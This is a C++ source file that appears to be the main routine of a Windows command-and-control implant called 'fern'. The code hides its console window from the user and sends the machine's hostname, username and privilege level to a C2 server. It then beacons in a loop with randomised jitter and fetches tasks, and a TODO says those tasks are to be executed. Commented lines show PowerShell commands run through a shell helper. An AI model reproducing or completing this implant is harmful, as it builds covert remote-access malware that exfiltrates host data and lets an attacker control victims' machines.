#include <iostream>
#include <string>
#include <windows.h>
#include <random>
#include <format>
#include "shell.h"
#include "network_operations.h"
#include "agent.h"

int getRandom(int min, int max) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(min, max);
    return dis(gen);
}

int main() {
    //Hiding console from user
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    //Initializing agent
    agent fern;
    //register string, send to tell us that the agent is alive and working
    std::string reg {std::format("{},{},{}",fern.getHostname(), fern.getUsername(), fern.getPrivilege())};
    //TODO remove these later, commands should be taken from the C2 server
    //std::cout << reg;
    //const std::string cmd = "powershell.exe <asd>";
    //std::string output = shell(cmd);
    //std::cout << fern.getport() << fern.getip() << fern.getUsername() << fern.getHostname() << "\n";
    //std::cout << "Output:" << output << "\n";

    std::string ip{fern.getip()};
    unsigned int port{fern.getport()};

    while (true) {
        int jitter = getRandom(-2500, 5000);
        std::string regresponse {post(ip, port, REGISTER, reg)};

        if(regresponse.empty()){
            Sleep(500 + jitter);
            continue;
        }
        else {
            std::string response{get(ip, port, TASKS)};
            //TODO parse response, get tasks for our agent and execute them
            std::cout << response << "\n";
            Sleep(fern.getSleep() + jitter);
        }
    }
}
